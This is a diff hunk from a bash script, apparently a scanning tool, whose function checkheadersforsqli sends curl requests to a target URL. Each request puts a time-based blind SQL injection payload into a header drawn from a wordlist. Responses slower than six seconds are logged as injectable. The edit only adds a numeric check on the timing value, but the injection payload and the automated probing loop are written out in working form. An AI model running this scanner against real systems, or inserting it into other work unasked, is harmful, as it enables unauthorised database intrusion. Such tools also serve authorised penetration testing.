@@ -224,9 +224,11 @@ checkheadersforsqli(){
 			cat ~/tools/__diccionarios/headers.txt | while read head; do
 				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "%{time_starttransfer}" --max-redirs 5 --connect-timeout 15 --max-time 15 $url)
 				time=$(echo "$response" | tail -1 | awk -F  "." '{print $1}')
-				if (($time >= 6)); then
-					echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
-					echo "$response" >> $2
+				if [[ $time =~ '^[0-9]+$' ]] ; then
+					if (($time >= 6)); then
+						echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
+						echo "$response" >> $2
+					fi
 				fi
 			done
 		fi
